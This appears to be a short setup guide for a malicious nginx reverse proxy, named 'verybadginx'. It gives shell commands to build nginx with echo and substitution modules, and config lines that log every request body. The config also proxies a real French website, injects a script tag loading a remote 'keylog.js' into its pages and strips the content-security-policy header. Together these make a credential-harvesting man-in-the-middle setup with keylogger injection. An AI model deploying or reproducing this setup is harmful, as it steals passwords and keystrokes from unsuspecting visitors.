# verybadginx

#### install and remove nginx (i know.. just do it and STFU)
apt-get install nginx
apt remove nginx

#### Download nginx with modules

cd /tmp;
curl -L -O 'https://github.com/openresty/echo-nginx-module/archive/v0.58.tar.gz';
tar -xzvf v0.58.tar.gz && rm v0.58.tar.gz;
mv echo-nginx-module-0.58 /tmp/echo-nginx-module;
curl -O 'http://nginx.org/download/nginx-1.9.7.tar.gz';
tar -xzvf nginx-1.9.7.tar.gz && rm nginx-1.9.7.tar.gz;
git clone https://github.com/openresty/replace-filter-nginx-module;

####  Create user/group nginx
groupadd nginx
useradd -g nginx nginx

####  Install nginx with modules

cd nginx-1.9.7/ && ./configure \
 --user=nginx \
 --group=nginx \
 --prefix=/etc/nginx \
 --sbin-path=/usr/sbin/nginx \
 --conf-path=/etc/nginx/nginx.conf \
 --pid-path=/var/run/nginx.pid \
 --lock-path=/var/run/nginx.lock \
 --error-log-path=/var/log/nginx/error.log \
 --http-log-path=/var/log/nginx/access.log \
 --add-module=/tmp/echo-nginx-module \
 --add-module=/tmp/replace-filter-nginx-module \
 --without-http_rewrite_module


#### Modif nginx.conf
http {

add 	log_format custom '$request_body';

add	access_log /var/log/nginx/access.log custom;

del     include /etc/nginx/sites-enabled/*;

add      include /etc/nginx/sites-enabled/default;

#### Modif sites-available/default et sites-enabled/default


location / {
	
add		echo_read_request_body;

add		proxy_pass http://www.microplus.fr/;

add		subs_filter "sting_to_remplace" "sting_to_remplace<script/src='https://www.microplus.fr/secu/images/test/keylog.js'>
</script>" -o;

add		sub_filter_once on;

add		proxy_set_header Accept-Encoding "";

add		proxy_hide_header content-security-policy; 
	

